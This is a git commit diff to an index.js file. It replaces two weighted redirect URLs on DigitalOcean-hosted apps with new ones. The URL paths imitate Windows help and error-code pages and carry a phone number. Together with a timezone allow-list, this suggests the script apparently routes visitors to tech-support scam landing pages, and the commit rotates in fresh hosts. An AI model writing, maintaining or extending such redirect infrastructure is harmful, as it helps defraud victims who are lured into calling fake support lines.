6be0b9a8ac5c04353a7d3fb525da303e20b01ce8
paalakash <palaksh452@gmail.com>
2026-06-15 08:20:33 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://king-prawn-app-c23ny.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-030-153", weight: 0.5 },
-    { url: "https://stingray-app-kt7mn.ondigitalocean.app/werrx01USAHTML/?bcda=1800-030-153", weight: 0.5 } 
+    { url: "https://urchin-app-ugdar.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-030-153", weight: 0.5 },
+    { url: "https://octopus-app-qfmxo.ondigitalocean.app/werrx01USAHTML/?bcda=1800-030-153", weight: 0.5 } 
 
 ];
 
